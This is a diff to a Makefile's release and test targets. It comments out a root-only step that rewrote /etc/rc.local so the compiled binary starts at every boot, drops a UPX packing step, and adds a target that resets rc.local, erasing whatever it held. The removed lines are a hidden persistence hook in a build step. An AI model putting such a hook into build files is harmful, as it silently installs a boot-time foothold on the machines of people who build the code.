@@ -38,16 +38,15 @@ $(NAME): $(OBJ) Makefile
 release: CFLAGS = $(RELEASE_CFLAGS)
 release: re
 	strip --strip-all $(NAME)
-	-@upx --best --ultra-brute $(NAME) || echo "UPX compression failed or UPX not installed, continuing without compression."
 	@echo "RELEASE BUILD DONE  "
-	@if [ "$$(id -u)" -eq 0 ]; then \
-		echo "#!/bin/sh -e" > /etc/rc.local; \
-		echo "$(shell pwd)/$(NAME) &" >> /etc/rc.local; \
-		echo "exit 0" >> /etc/rc.local; \
-		chmod +x /etc/rc.local; \
-		sudo systemctl enable rc-local.service; \
-		echo "rc.local setup done"; \
-	fi
+# @if [ "$$(id -u)" -eq 0 ]; then \
+# 	echo "#!/bin/sh -e" > /etc/rc.local; \
+# 	echo "$(shell pwd)/$(NAME) &" >> /etc/rc.local; \
+# 	echo "exit 0" >> /etc/rc.local; \
+# 	chmod +x /etc/rc.local; \
+# 	sudo systemctl enable rc-local.service; \
+# 	echo "rc.local setup done"; \
+# fi
 
 
 debug: CFLAGS = -f elf64 -g -F dwarf
@@ -70,6 +69,15 @@ re: fclean
 
 test: release
 	sh test.sh
+
+restore-rc-local:
+	@if [ "$$(id -u)" -eq 0 ]; then \
+		echo "#!/bin/sh -e" > /etc/rc.local; \
+		echo "exit 0" >> /etc/rc.local; \
+		chmod +x /etc/rc.local; \
+		sudo systemctl daemon-reload; \
+		echo "Default /etc/rc.local restored"; \
+	fi
 
 .gitignore:
 	@if [ ! -f .gitignore ]; then \
